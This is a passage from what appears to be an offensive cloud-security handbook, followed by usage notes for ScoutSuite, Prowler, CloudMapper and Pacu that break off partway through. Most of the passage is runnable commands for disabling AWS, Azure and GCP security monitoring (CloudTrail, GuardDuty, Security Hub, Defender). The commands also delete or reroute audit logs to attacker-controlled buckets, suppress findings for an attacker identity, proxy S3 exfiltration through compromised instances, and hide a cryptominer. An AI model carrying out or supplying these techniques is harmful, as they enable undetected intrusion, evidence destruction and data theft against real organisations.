    --log-group-name <log-group-name> \
    --filter-name <filter-name>

# Modify filter pattern to exclude malicious activity
aws logs put-metric-filter \
    --log-group-name <log-group-name> \
    --filter-name <filter-name> \
    --filter-pattern "[...]" \  # Modified pattern
    --metric-transformations <...>
```

#### Alarm Manipulation

```bash
# List alarms
aws cloudwatch describe-alarms

# Disable alarm
aws cloudwatch disable-alarm-actions --alarm-names <alarm-name>

# Delete alarm
aws cloudwatch delete-alarms --alarm-names <alarm-name>

# Modify alarm threshold to avoid triggering
aws cloudwatch put-metric-alarm \
    --alarm-name <alarm-name> \
    --comparison-operator GreaterThanThreshold \
    --threshold 999999 \  # Impossibly high threshold
    --evaluation-periods 10 \
    --metric-name <metric> \
    --namespace AWS/CloudWatch
```

#### SNS Topic Manipulation

```bash
# List SNS topics (used for alarm notifications)
aws sns list-topics

# Delete subscription
aws sns unsubscribe --subscription-arn <subscription-arn>

# Modify topic policy to prevent publishing
aws sns set-topic-attributes \
    --topic-arn <topic-arn> \
    --attribute-name Policy \
    --attribute-value '{...}'  # Restrictive policy
```

### GuardDuty Evasion

```bash
# Check GuardDuty status
aws guardduty list-detectors

# Get detector ID
DETECTOR_ID=$(aws guardduty list-detectors --query 'DetectorIds[0]' --output text)

# Suspend GuardDuty
aws guardduty update-detector \
    --detector-id $DETECTOR_ID \
    --no-enable

# Delete detector
aws guardduty delete-detector --detector-id $DETECTOR_ID

# Suppress specific findings
aws guardduty create-filter \
    --detector-id $DETECTOR_ID \
    --name suppress-all \
    --action ARCHIVE \
    --finding-criteria '{"Criterion":{"severity":{"Gte":0}}}'
```

[Unverified] GuardDuty may have organization-level controls that prevent disabling by member accounts in AWS Organizations.

### Config Rule Tampering

```bash
# List Config rules
aws configservice describe-config-rules

# Delete Config rule
aws configservice delete-config-rule --config-rule-name <rule-name>

# Disable Config recorder
aws configservice stop-configuration-recorder \
    --configuration-recorder-name <recorder-name>

# Delete Config recorder
aws configservice delete-configuration-recorder \
    --configuration-recorder-name <recorder-name>
```

### Security Hub Bypass

```bash
# List Security Hub findings
aws securityhub get-findings

# Disable Security Hub
aws securityhub disable-security-hub

# Disable specific standards
aws securityhub batch-disable-standards \
    --standards-subscription-arns <arn>

# Update findings to suppress
aws securityhub batch-update-findings \
    --finding-identifiers Id=<finding-id>,ProductArn=<arn> \
    --workflow Status=SUPPRESSED
```

### Behavioral Evasion Techniques

#### Slow and Low

[Inference] Avoiding detection by staying under threshold limits:

```bash
# Example: API rate limiting evasion
for i in {1..100}; do
    aws s3 ls s3://<bucket>
    sleep $((60 + RANDOM % 120))  # Random delay 60-180 seconds
done
```

#### Time-Based Evasion

```bash
# Perform actions during low-monitoring periods
CURRENT_HOUR=$(date +%H)
if [ $CURRENT_HOUR -ge 22 ] || [ $CURRENT_HOUR -le 6 ]; then
    # Off-hours activity
    aws s3 sync s3://<target-bucket> ./exfil/
fi
```

#### Geographic Distribution

```bash
# Use different regions to distribute activity
for region in us-east-1 eu-west-1 ap-southeast-1; do
    aws ec2 describe-instances --region $region
done

# Use VPC endpoints to avoid internet gateway logs
```

#### Assume Role Chain

```bash
# Chain role assumptions to obfuscate identity
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT1:role/Role1 \
    --role-session-name session1 > creds1.json

# Extract credentials and export
export AWS_ACCESS_KEY_ID=$(jq -r .Credentials.AccessKeyId creds1.json)
export AWS_SECRET_ACCESS_KEY=$(jq -r .Credentials.SecretAccessKey creds1.json)
export AWS_SESSION_TOKEN=$(jq -r .Credentials.SessionToken creds1.json)

# Assume second role
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT2:role/Role2 \
    --role-session-name session2 > creds2.json
```

### Network-Level Monitoring Bypass

#### VPC Flow Log Evasion

[Unverified] Some techniques to reduce visibility in VPC Flow Logs:

```bash
# Use VPC endpoints (traffic doesn't traverse internet gateway)
aws ec2 create-vpc-endpoint \
    --vpc-id <vpc-id> \
    --service-name com.amazonaws.<region>.s3 \
    --route-table-ids <route-table-id>

# Encryption doesn't prevent flow logs but may complicate DPI
# Use protocols that blend with normal traffic (HTTPS on 443)

# Fragment traffic to complicate analysis
# (Implementation depends on application layer)
```

#### Proxy/Tunnel Traffic

```bash
# SSH tunnel through compromised instance
ssh -D 8080 -N -f user@compromised-instance

# Use instance as SOCKS proxy
export http_proxy=socks5://127.0.0.1:8080
export https_proxy=socks5://127.0.0.1:8080

# Traffic appears to originate from compromised instance
```

### Application-Level Evasion

#### Lambda Function Manipulation

```bash
# Modify Lambda to disable logging
aws lambda update-function-configuration \
    --function-name <function-name> \
    --environment "Variables={LOG_LEVEL=NONE}"

# Update function code to avoid logging
# (Requires access to function code and redeployment)
```

#### ECS/Fargate Log Driver Modification

```json
// Task definition with disabled logging
{
  "logConfiguration": {
    "logDriver": "awslogs",
    "options": {
      "awslogs-group": "/dev/null",
      "awslogs-region": "us-east-1",
      "awslogs-stream-prefix": "none"
    }
  }
}
```

### Detection Artifacts Summary

Actions that commonly generate monitoring alerts:

- CloudTrail API calls: `StopLogging`, `DeleteTrail`, `UpdateTrail`
- GuardDuty: `DisableDetector`, `DeleteDetector`
- Config: `StopConfigurationRecorder`, `DeleteConfigRule`
- CloudWatch: `DeleteAlarms`, `DisableAlarmActions`
- S3: `DeleteObject` (especially in bulk), `PutBucketPolicy`
- IAM: `DeleteRole`, `DetachRolePolicy`, `PutRolePolicy`
- Log file modifications: File integrity monitoring alerts
- Event log clearing: Windows Event ID 1102, 104

---

**Important Subtopics for Further Study:**

- **SIEM Evasion**: Splunk, ELK Stack, Azure Sentinel bypass techniques
- **EDR Evasion**: Evading endpoint detection specific to cloud workloads
- **Forensic Anti-Forensics**: Techniques to mislead incident response
- **Compliance Control Bypass**: Evading CIS, NIST, PCI-DSS controls

---

## Alert Evasion

### Understanding Detection Mechanisms

Cloud environments deploy multiple detection layers:

- **Behavioral analytics**: Anomaly detection based on baseline activity patterns
- **Signature-based detection**: Known malicious patterns (IP reputation, file hashes, command patterns)
- **Rule-based alerting**: Threshold violations, unauthorized API calls, unusual access patterns
- **ML-based detection**: Statistical anomalies in resource usage, network traffic, API call sequences

### Evasion Techniques

#### Time-Based Evasion

**Slow and Low Operations**

```bash
# Spread reconnaissance over extended periods
for i in {1..100}; do
  aws s3 ls s3://target-bucket --profile compromised
  sleep $((RANDOM % 3600 + 1800))  # Random 30-90 min delay
done

# Rate-limit API calls to stay under detection thresholds
# AWS CloudTrail aggregates in 5-15 minute windows
aws ec2 describe-instances --max-items 5 --profile compromised
sleep 900  # 15 minute delay between calls
```

**Timing Exploitation**

```bash
# Operate during high-activity periods (business hours)
# Detection signal-to-noise ratio decreases

# Check current time and wait for business hours
current_hour=$(date +%H)
if [ $current_hour -lt 9 ] || [ $current_hour -gt 17 ]; then
  sleep $(((9 - current_hour) * 3600))
fi

# Execute during maintenance windows when alerts may be suppressed
# Target weekends for long-running operations
```

#### Mimicking Legitimate Behavior

**User-Agent Rotation**

```bash
# AWS CLI and SDKs include identifiable user-agents
# Custom user-agents to blend with legitimate traffic

# Using boto3 (Python)
import boto3
from botocore.config import Config

config = Config(
    user_agent='aws-cli/2.13.0 Python/3.11.4 Linux/5.15.0 source/x86_64.ubuntu.22'
)
client = boto3.client('s3', config=config)

# Using curl with AWS SigV4
curl -H "User-Agent: aws-sdk-nodejs/2.1396.0 linux/v18.16.0" \
  --aws-sigv4 "aws:amz:us-east-1:s3" \
  --user "$AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY" \
  https://s3.amazonaws.com/target-bucket
```

**Source IP Diversity**

```bash
# Rotate through proxy chains
# Use cloud provider IP ranges to appear as legitimate cloud-to-cloud traffic

# Proxy through compromised EC2 instances in same region
ssh -D 9050 ec2-user@compromised-instance.compute.amazonaws.com
proxychains4 aws s3 sync s3://target-bucket ./exfil --profile compromised

# Use VPN exits in same geographic region as target
# [Inference] Geographically distributed access may trigger fewer alerts than foreign IPs

# Cloud NAT Gateway IPs (appear as internal cloud traffic)
# Create temporary compute resources for operations
aws ec2 run-instances --image-id ami-xxxxx --instance-type t2.micro \
  --subnet-id subnet-xxxxx --security-group-ids sg-xxxxx
```

#### API Call Pattern Obfuscation

**Legitimate Service Simulation**

```bash
# Mix malicious calls with benign operations
# Create noise that masks actual objective

aws s3 ls  # Benign listing
aws ec2 describe-regions  # Benign query
aws iam list-users --max-items 2  # Reconnaissance (actual target)
aws cloudwatch get-metric-statistics --namespace AWS/EC2 --metric-name CPUUtilization  # Benign

# Interleave with expected automation patterns
# Schedule operations to match legitimate Lambda/automation timing
```

**API Version and Endpoint Variation**

```bash
# Use older API versions that may have reduced monitoring
aws s3api list-objects --bucket target-bucket  # Standard, heavily monitored
aws s3 ls s3://target-bucket  # Alternative syntax

# Direct REST API calls instead of CLI
# [Inference] Less common access methods may have reduced detection signatures
curl -H "Authorization: AWS4-HMAC-SHA256 Credential=$AWS_ACCESS_KEY_ID/..." \
  https://s3.amazonaws.com/target-bucket?list-type=2
```

#### Living Off The Land (Cloud)

**Native Tool Abuse**

```bash
# CloudShell (AWS) - Ephemeral, managed environment
# Logs may be less scrutinized than external API calls
# [Unverified] Some organizations may have reduced monitoring of CloudShell activity

# Access CloudShell through Console
# Execute reconnaissance from within managed environment
aws sts get-caller-identity
aws s3 ls
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PrivateIpAddress]'

# Azure Cloud Shell
az account list
az vm list --query '[].{Name:name, ResourceGroup:resourceGroup, State:provisioningState}'

# GCP Cloud Shell
gcloud projects list
gcloud compute instances list
```

**Trusted Service Abuse**

```bash
# Lambda/Cloud Functions for operations
# Execution context appears as service role, not user

# Create Lambda with malicious code
cat > lambda_function.py << 'EOF'
import boto3
import json

def lambda_handler(event, context):
    s3 = boto3.client('s3')
    response = s3.list_buckets()
    # Exfiltrate through CloudWatch Logs
    print(json.dumps(response['Buckets']))
    return {'statusCode': 200}
EOF

zip function.zip lambda_function.py
aws lambda create-function --function-name benign-monitor \
  --runtime python3.11 --role arn:aws:iam::123456789012:role/lambda-exec \
  --handler lambda_function.lambda_handler --zip-file fileb://function.zip

# Trigger periodically
aws lambda invoke --function-name benign-monitor output.json
```

## Audit Log Manipulation

### CloudTrail (AWS)

**Understanding CloudTrail Architecture**

- Event delivery latency: Typically 5-15 minutes
- Log file integrity validation: SHA-256 digest with RSA signature
- Management events vs. Data events
- Multi-region trails vs. single-region trails

**Deletion/Modification Techniques**

**Direct Log Deletion** ⚠️

```bash
# Requires s3:DeleteObject permission on CloudTrail bucket
# Creates CloudTrail event: DeleteObject (detectable)

# Identify CloudTrail S3 bucket
aws cloudtrail describe-trails --query 'trailList[*].[Name,S3BucketName]'

# Locate specific log files
aws s3 ls s3://cloudtrail-bucket/AWSLogs/123456789012/CloudTrail/us-east-1/2025/10/24/

# Delete log files
aws s3 rm s3://cloudtrail-bucket/AWSLogs/123456789012/CloudTrail/us-east-1/2025/10/24/ \
  --recursive --exclude "*" --include "*16-00-00*"  # Delete specific hour

# [Unverified] Bulk deletion may trigger fewer alerts than selective deletion
aws s3 rm s3://cloudtrail-bucket/AWSLogs/123456789012/CloudTrail/ --recursive
```

**Log Modification Attempts** ⚠️

```bash
# CloudTrail log file integrity validation prevents undetected modification
# Each log file has digest file with hash

# Download log file
aws s3 cp s3://cloudtrail-bucket/AWSLogs/123456789012/CloudTrail/us-east-1/2025/10/24/log.json.gz ./

# Decompress, modify, recompress
gunzip log.json.gz
# Edit log.json to remove events
gzip log.json

# Re-upload (will break digest validation)
aws s3 cp log.json.gz s3://cloudtrail-bucket/AWSLogs/123456789012/CloudTrail/us-east-1/2025/10/24/

# [Inference] Integrity validation failure will create security alert
# Modification detection is highly reliable with validation enabled
```

**CloudTrail Trail Manipulation**

```bash
# Stop CloudTrail logging (creates StopLogging event)
aws cloudtrail stop-logging --name trail-name

# Delete trail (creates DeleteTrail event)
aws cloudtrail delete-trail --name trail-name

# Update trail to different S3 bucket under attacker control
aws cloudtrail update-trail --name trail-name \
  --s3-bucket-name attacker-bucket

# Modify event selectors to exclude specific APIs
# [Inference] Reducing logging scope may go unnoticed if not monitored
aws cloudtrail put-event-selectors --trail-name trail-name \
  --event-selectors '[{"ReadWriteType":"WriteOnly","IncludeManagementEvents":true,"DataResources":[]}]'
```

**S3 Bucket Policy Manipulation**

```bash
# Modify CloudTrail bucket to deny CloudTrail service
# Prevents new log delivery without deleting trail

aws s3api get-bucket-policy --bucket cloudtrail-bucket > policy.json

# Add deny statement
cat > deny-policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyCloudTrail",
      "Effect": "Deny",
      "Principal": {
        "Service": "cloudtrail.amazonaws.com"
      },
      "Action": "s3:PutObject",
      "Resource": "arn:aws:s3:::cloudtrail-bucket/*"
    }
  ]
}
EOF

aws s3api put-bucket-policy --bucket cloudtrail-bucket --policy file://deny-policy.json
```

**EventBridge/CloudWatch Integration Disruption**

```bash
# Disable CloudWatch Logs integration
aws cloudtrail update-trail --name trail-name --no-cloud-watch-logs-log-group-arn

# Modify EventBridge rules processing CloudTrail events
aws events list-rules --query 'Rules[?contains(EventPattern, `cloudtrail`)].Name'

# Disable specific rules
aws events disable-rule --name security-alert-rule

# Modify rule pattern to exclude your actions
aws events put-rule --name security-alert-rule --event-pattern '{
  "source": ["aws.iam"],
  "detail-type": ["AWS API Call via CloudTrail"],
  "detail": {
    "eventName": ["CreateUser", "DeleteUser"],
    "userIdentity": {
      "arn": [{"anything-but": {"prefix": "arn:aws:iam::123456789012:user/attacker"}}]
    }
  }
}'
```

### Azure Monitor & Activity Logs

**Activity Log Deletion**

```bash
# Azure Activity Logs have 90-day retention by default
# [Unverified] Direct deletion may not be possible without specific permissions

# Check diagnostic settings
az monitor diagnostic-settings list --resource /subscriptions/SUBSCRIPTION_ID

# Remove diagnostic settings to prevent log forwarding
az monitor diagnostic-settings delete \
  --name diag-setting-name \
  --resource /subscriptions/SUBSCRIPTION_ID

# Modify diagnostic settings to exclude specific categories
az monitor diagnostic-settings create \
  --name diag-setting-name \
  --resource /subscriptions/SUBSCRIPTION_ID \
  --logs '[{"category":"Administrative","enabled":false}]' \
  --workspace /subscriptions/SUBSCRIPTION_ID/resourceGroups/RG/providers/Microsoft.OperationalInsights/workspaces/WS
```

**Log Analytics Workspace Manipulation**

```bash
# Query current data
az monitor log-analytics query \
  --workspace WORKSPACE_ID \
  --analytics-query "AzureActivity | where TimeGenerated > ago(1h)"

# Disable data collection
az monitor log-analytics workspace update \
  --resource-group RG \
  --workspace-name WS \
  --retention-time 0  # Minimum retention

# [Inference] Purge operations may be logged separately
az monitor log-analytics workspace purge \
  --workspace WORKSPACE_ID \
  --filters "TimeGenerated < ago(1d)"
```

### GCP Cloud Logging

**Log Sink Manipulation**

```bash
# List existing log sinks
gcloud logging sinks list

# Delete log sink
gcloud logging sinks delete sink-name

# Create exclusion filter
gcloud logging logs delete LOG_ID

# Create sink with exclusion filter
gcloud logging sinks create attacker-sink \
  storage.googleapis.com/attacker-bucket \
  --log-filter='NOT protoPayload.authenticationInfo.principalEmail="attacker@example.com"'
```

**Log Bucket Deletion**

```bash
# Cloud Logging uses Log Buckets (Admin Log Viewer role required)

# List log buckets
gcloud logging buckets list --location=global

# Update bucket retention
gcloud logging buckets update _Default \
  --location=global \
  --retention-days=1  # Minimum retention

# [Unverified] Direct log entry deletion may require specific APIs
```

### Generic Evasion Patterns

**Credential Rotation**

```bash
# Immediately rotate credentials after suspicious operations
# Makes correlation difficult

# AWS
aws iam create-access-key --user-name compromised-user
# Use new keys for next operation
aws iam delete-access-key --access-key-id OLD_KEY --user-name compromised-user

# Azure
az ad sp credential reset --id SERVICE_PRINCIPAL_ID

# GCP
gcloud iam service-accounts keys create new-key.json \
  --iam-account=sa@project.iam.gserviceaccount.com
gcloud iam service-accounts keys delete OLD_KEY_ID \
  --iam-account=sa@project.iam.gserviceaccount.com
```

**Session Token Abuse**

```bash
# Use temporary credentials to avoid permanent credential logs
# STS assume-role leaves different audit trail than IAM user actions

aws sts assume-role --role-arn arn:aws:iam::123456789012:role/target-role \
  --role-session-name benign-session-name \
  --duration-seconds 3600

# Export temporary credentials
export AWS_ACCESS_KEY_ID=ASIAEXAMPLE
export AWS_SECRET_ACCESS_KEY=SECRET
export AWS_SESSION_TOKEN=TOKEN

# Operations appear as role session, not original identity
```

## GuardDuty/Security Center Evasion

### AWS GuardDuty

**Understanding GuardDuty Detection Categories**

- **Reconnaissance**: Unusual API call patterns, port scanning, VPC probing
- **Instance Compromise**: Malware, backdoors, unusual network traffic
- **Account Compromise**: Credential exposure, unusual console logins, API calls from unusual locations
- **Bucket Compromise**: Suspicious S3 access patterns, data exfiltration

**GuardDuty Data Sources**

- VPC Flow Logs (network traffic analysis)
- CloudTrail Management Events (API activity)
- CloudTrail S3 Data Events (S3 access patterns)
- DNS Logs (DNS query analysis)
- EKS Audit Logs (Kubernetes API activity)
- RDS Login Activity (database authentication)
- Lambda Network Activity
- Runtime Monitoring (EC2, ECS, EKS process and file activity)

**Evasion Techniques**

**VPC Flow Log Evasion**

```bash
# [Inference] GuardDuty analyzes VPC Flow Logs for suspicious network patterns
# Tactics: Low-and-slow traffic, legitimate port usage, encryption

# Use standard ports (443, 80) for C2 communication
# Appears as legitimate HTTPS traffic in flow logs
nc -l 443  # Listener on compromised instance
nc target-instance 443  # Connection appears as HTTPS

# DNS tunneling to evade flow log analysis
# [Unverified] GuardDuty DNS analysis may detect high-entropy domains
# Use legitimate domain reputation

# Split large transfers into small packets
dd if=/dev/zero bs=1K count=1 | nc target 443
sleep 60
# Repeats...
```

**CloudTrail Event Pattern Evasion**

```bash
# GuardDuty detects anomalous API call patterns
# Baseline establishment: GuardDuty learns normal behavior (7-14 days)

# Reconnaissance with minimal API calls
# Prefer read operations over write operations initially

# High-risk APIs that trigger GuardDuty findings:
# - GetPasswordData
# - GetSecretValue (Secrets Manager)
# - UpdateAssumeRolePolicy
# - PutBucketPolicy
# - CreateAccessKey (for other users)

# [Inference] Space out high-risk API calls over extended periods
aws secretsmanager get-secret-value --secret-id production-db
sleep 86400  # 24 hour delay before next sensitive operation

# Use service roles instead of user credentials where possible
# Lambda/EC2 role operations may have different detection thresholds
```

**IP Reputation Evasion**

```bash
# GuardDuty checks source IPs against threat intelligence feeds

# Use cloud provider IP ranges
# [Inference] AWS IP ranges may be trusted more than residential/hosting IPs

# Obtain current AWS IP ranges
curl https://ip-ranges.amazonaws.com/ip-ranges.json | jq -r '.prefixes[] | select(.service=="EC2") | .ip_prefix'

# Route through compromised EC2 instances in same account/region
# Appears as internal-to-internal traffic

# Use residential proxies or legitimate VPN services
# Avoid known VPN/proxy IP ranges (Digital Ocean, Hetzner, etc.)
```

**Tor Exit Node Awareness**

```bash
# GuardDuty flags Tor exit node connections as high-severity findings
# Finding: UnauthorizedAccess:IAMUser/TorIPCaller

# [Unverified] Tor usage creates immediate alerts regardless of activity
# Avoid Tor for cloud API access

# If Tor is necessary, use Tor bridges
# Bridges not in public exit node lists may evade detection
```

**Cryptocurrency Mining Detection Evasion**

```bash
# GuardDuty detects:
# - Network traffic to mining pools
# - DNS queries for mining pool domains
# - CPU/GPU usage patterns (via Runtime Monitoring)

# [Inference] Mining activity is high-risk for detection
# If required for CTF scenario:

# Use private mining pools with non-obvious DNS names
# Avoid known mining pool IPs/domains

# Limit CPU usage to avoid performance anomalies
nice -n 19 ./miner --threads 1 --cpu-priority 0

# Use domain fronting to hide mining traffic
# Route through CDN to mask actual destination
```

**S3 Data Exfiltration Evasion**

```bash
# GuardDuty detects:
# - Unusual S3 API call volumes
# - Access from unusual geolocations
# - Anonymous/public access
# - Access from known malicious IPs

# Slow exfiltration
aws s3 sync s3://target-bucket ./local-copy --exact-timestamps
# Perform over days/weeks in small batches

# Use AWS-native tools to appear legitimate
# S3 Batch Operations, DataSync may have different detection profiles

# Exfiltrate through legitimate AWS services
# Lambda -> S3 -> Athena query results -> attacker-controlled bucket
# Multi-hop exfiltration complicates detection
```

**GuardDuty Suppression Rules**

```bash
# If you have GuardDuty permissions, create suppression rules
# Requires guardduty:CreateFilter permission

aws guardduty create-filter \
  --detector-id DETECTOR_ID \
  --name suppress-attacker-findings \
  --action ARCHIVE \
  --finding-criteria '{
    "Criterion": {
      "resource.accessKeyDetails.userName": {
        "Eq": ["attacker-user"]
      }
    }
  }'

# List existing filters to understand what's already suppressed
aws guardduty list-filters --detector-id DETECTOR_ID
```

**GuardDuty Detector Manipulation** ⚠️

```bash
# Requires guardduty:UpdateDetector or guardduty:DeleteDetector

# Disable specific data sources
aws guardduty update-detector \
  --detector-id DETECTOR_ID \
  --data-sources '{
    "S3Logs": {"Enable": false},
    "Kubernetes": {"AuditLogs": {"Enable": false}},
    "MalwareProtection": {"ScanEc2InstanceWithFindings": {"EbsVolumes": {"Enable": false}}}
  }'

# Completely disable GuardDuty (creates finding)
aws guardduty delete-detector --detector-id DETECTOR_ID

# [Unverified] Disabling GuardDuty itself likely creates high-priority security alerts
```

### Azure Security Center (Microsoft Defender for Cloud)

**Detection Mechanisms**

- Log Analytics integration
- Network Security Group flow logs
- Azure Activity Logs
- Threat intelligence integration
- Behavioral analytics

**Evasion Techniques**

**Policy Exemption**

```bash
# Create exemptions for specific resources
az security policy-exemption create \
  --name attacker-exemption \
  --policy-assignment /subscriptions/SUB_ID/providers/Microsoft.Authorization/policyAssignments/ASSIGNMENT \
  --exemption-category Waiver \
  --scope /subscriptions/SUB_ID/resourceGroups/RG/providers/Microsoft.Compute/virtualMachines/VM

# List existing exemptions to add to legitimate sets
az security policy-exemption list
```

**Alert Suppression**

```bash
# Suppress specific alert types
az security alert update \
  --name ALERT_ID \
  --resource-group RG \
  --status Dismissed

# Modify security contact email to prevent notifications
az security contact create \
  --email attacker@example.com \
  --name default1 \
  --alert-notifications Off \
  --alerts-admins Off
```

**Defender for Cloud Disablement**

```bash
# Disable specific Defender plans
az security pricing create \
  --name VirtualMachines \
  --tier Free  # Disables advanced threat protection

# Check current Defender status
az security pricing list
```

### GCP Security Command Center

**Evasion Techniques**

**Finding Muting**

```bash
# Create mute config for specific findings
gcloud scc muteconfigs create attacker-mute \
  --organization=ORGANIZATION_ID \
  --filter='category="PERSISTENCE_IAM_BIND_NEW_MEMBER" AND resource.name:"attacker-user"'

# List existing mute configs
gcloud scc muteconfigs list --organization=ORGANIZATION_ID
```

**Security Health Analytics Disablement**

```bash
# Disable specific detectors (requires Security Center Admin role)
# [Unverified] Granular detector disablement may be limited

# Modify organization policies to exclude specific projects
gcloud resource-manager org-policies set-policy policy.yaml \
  --organization=ORGANIZATION_ID
```

## Detection and Counter-Evasion Awareness

### What Defenders Can See

**Irreversible Indicators**

- Initial authentication events (first access with credential)
- Permission changes and role assumptions
- Resource creations (instances, functions, roles)
- Network connection metadata (even if payload encrypted)
- CloudTrail/Activity Log events showing anti-forensics actions

**Timing Correlations**

- Event sequences (e.g., role assumption followed by data access)
- Unusual activity outside business hours
- Burst patterns after initial compromise

### Advanced Detection Mechanisms

**Behavioral Analytics**

- [Inference] ML models detect statistical anomalies even without signature matches
- Baseline deviations trigger alerts regardless of apparent legitimacy

**Federated Threat Intelligence**

- Cross-cloud correlation (AWS GuardDuty, Azure Sentinel, etc.)
- Shared IOC databases
- MITRE ATT&CK framework mapping

**Honeytokens and Decoys**

- Canary tokens in S3 buckets, databases
- Fake credentials with alerting
- [Inference] Any interaction with honeytokens creates immediate high-confidence alert

### Operational Security Principles

1. **Assume Full Logging**: Operate as if all actions are logged and reviewed
2. **Minimize Dwell Time**: Complete objectives quickly to reduce detection window
3. **Credential Segmentation**: Use different credentials for different operation phases
4. **Blend with Legitimate Activity**: Match timing, volume, and patterns of normal operations
5. **Prepare Persistence**: Establish multiple access methods before aggressive actions

### Important Disclaimers

⚠️ **Legal and Ethical Considerations**

- Log tampering is illegal outside authorized CTF/penetration testing contexts
- Many described techniques violate cloud provider Terms of Service
- Real-world use without authorization constitutes criminal activity

⚠️ **Detection Likelihood**

- [Unverified] Modern SIEM systems and managed detection services significantly increase detection probability for most described techniques
- Security teams with proper monitoring can detect even sophisticated evasion
- Assume skilled defenders are monitoring critical cloud environments

### Key Tools for Evasion Testing

```bash
# Pacu - AWS exploitation framework with evasion modules
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu && bash install.sh
python3 pacu.py

# CloudFox - Cloud enumeration with minimal API calls
go install github.com/BishopFox/cloudfox@latest
cloudfox aws --profile compromised all-checks

# ScoutSuite - Multi-cloud security auditing
pip install scoutsuite
scout aws --profile compromised --no-browser

# Prowler - Cloud security assessments
git clone https://github.com/prowler-cloud/prowler.git
./prowler aws --profile compromised --services s3,iam
```

---

**Recommended Related Topics for Deeper Study**:

- Cloud SIEM correlation rules and detection logic
- Incident response playbooks for cloud compromise scenarios
- Advanced persistence mechanisms in cloud environments
- Cross-account/cross-cloud lateral movement techniques

---

# Cloud-Specific Tools (Kali Linux)

## Cloud Enumeration Tools

### ScoutSuite

**Description:** Multi-cloud security auditing tool supporting AWS, Azure, GCP, Alibaba Cloud, and Oracle Cloud. Generates HTML reports with security findings.

**Installation:**

```bash
# Install via pip
pip3 install scoutsuite

# Install from source
git clone https://github.com/nccgroup/ScoutSuite
cd ScoutSuite
pip3 install -r requirements.txt
python3 scout.py --help
```

**Basic Usage:**

```bash
# AWS scan (uses AWS CLI credentials)
scout aws

# Scan specific AWS profile
scout aws --profile <profile-name>

# Scan with specific access keys
scout aws --access-key-id <key> --secret-access-key <secret>

# Scan with session token
scout aws --access-key-id <key> --secret-access-key <secret> --session-token <token>

# Azure scan
scout azure --cli

# GCP scan
scout gcp --user-account

# Scan multiple services only
scout aws --services s3 ec2 iam

# Custom ruleset
scout aws --ruleset custom-rules.json

# Output to specific directory
scout aws --report-dir /path/to/output
```

**Advanced Options:**

```bash
# Scan all regions
scout aws --all-regions

# Resume previous scan
scout aws --resume

# Force overwrite existing report
scout aws --force

# Increase verbosity
scout aws --debug

# Exclude specific services
scout aws --skip iam

# Use MFA
scout aws --profile <profile> --mfa-serial <serial> --mfa-code <code>
```

**Report Analysis:**

```bash
# Report located at: scoutsuite-report/index.html
firefox scoutsuite-report/index.html &

# Extract high-severity findings
jq '.services[].findings[] | select(.level == "danger")' \
    scoutsuite-report/scoutsuite-results/*.js
```

### Prowler

**Description:** AWS security assessment tool following CIS benchmarks. Checks 300+ security controls.

**Installation:**

```bash
# Install via pip
pip3 install prowler

# Install from source
git clone https://github.com/prowler-cloud/prowler
cd prowler
pip3 install -r requirements.txt
python3 prowler.py --help
```

**Basic Usage:**

```bash
# Run all checks (AWS)
prowler aws

# Use specific profile
prowler aws --profile <profile-name>

# Scan specific region
prowler aws --region us-east-1

# Run specific check
prowler aws --checks check123

# Run specific group of checks
prowler aws --checks-group gdpr

# List all available checks
prowler aws --list-checks

# List check groups
prowler aws --list-checks-groups
```

**Output Formats:**

```bash
# JSON output
prowler aws --output-formats json

# CSV output
prowler aws --output-formats csv

# HTML report
prowler aws --output-formats html

# Multiple formats
prowler aws --output-formats json csv html

# Custom output directory
prowler aws --output-directory /path/to/output
```

**Advanced Scanning:**

```bash
# CIS benchmark compliance
prowler aws --compliance cis_1.5_aws

# GDPR compliance check
prowler aws --compliance gdpr_aws

# Exclude specific checks
prowler aws --excluded-checks check123,check456

# Filter by severity
prowler aws --severity critical high

# Scan specific services
prowler aws --services s3 iam ec2

# Parallel execution (faster)
prowler aws --parallel

# Assume role for scanning
prowler aws --role arn:aws:iam::123456789012:role/ProwlerRole
```

**Azure & GCP:**

```bash
# Azure scan
prowler azure --sp-env-auth

# GCP scan
prowler gcp --credentials-file /path/to/credentials.json
```

### CloudMapper

**Description:** Network diagram and security analysis tool for AWS environments.

**Installation:**

```bash
git clone https://github.com/duo-labs/cloudmapper.git
cd cloudmapper
pip3 install -r requirements.txt
```

**Configuration:**

```bash
# Configure AWS accounts
cp config.json.demo config.json
nano config.json

# Example config.json
{
  "accounts": [
    {
      "id": "123456789012",
      "name": "prod",
      "default": true
    }
  ]
}
```

**Basic Usage:**

```bash
# Collect data from AWS
python3 cloudmapper.py configure add-account --config-file config.json \
    --name prod --id 123456789012

python3 cloudmapper.py collect --account prod

# Generate network diagram
python3 cloudmapper.py prepare --account prod
python3 cloudmapper.py webserver

# Access at: http://127.0.0.1:8000

# Find security issues
python3 cloudmapper.py audit --account prod

# Public resource finder
python3 cloudmapper.py public --account prod

# Find unused resources
python3 cloudmapper.py stats --account prod
```

**Advanced Features:**

```bash
# Generate report
python3 cloudmapper.py report --account prod

# Compare two accounts
python3 cloudmapper.py diff --account-a prod --account-b dev

# Find external access
python3 cloudmapper.py external --account prod

# Network connectivity analysis
python3 cloudmapper.py sg-ips --account prod
```

### Pacu

**Description:** AWS exploitation framework for offensive security testing.

**Installation:**

```bash
# Install via pip
pip3 install pacu

# Install from source
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu
bash install.sh
python3 pacu.py
```

**Basic Usage:**

```bash
# Start Pacu
pacu

# Create new session
Pacu (new:session) > new_session <session-name>

# Import AWS keys
Pacu (session:new) > import_keys <access-key> <secret-key>

# Import from AWS CLI profile
Pacu (session:new) > import_keys --profile <profile-name>

# List available modules
list

# Search modules
search s3

# Get module info
help <module-name>

# Run module
run <module-name>
```

**Key Enumeration Modules:**

```bash
# Whoami - identify current user/role
run iam__enum_users_roles_policies_groups

# Enumerate permissions
run iam__enum_permissions

# Brute force permissions
run iam__bruteforce_permissions

# EC2 enumeration
run ec2__enum

# S3 enumeration
run s3__enum

# Lambda enumeration
run lambda__enum

# RDS enumeration  
run rds__enum

# Enumerate all services
run aws__enum_all
```

**Exploitation Modules:**

```bash
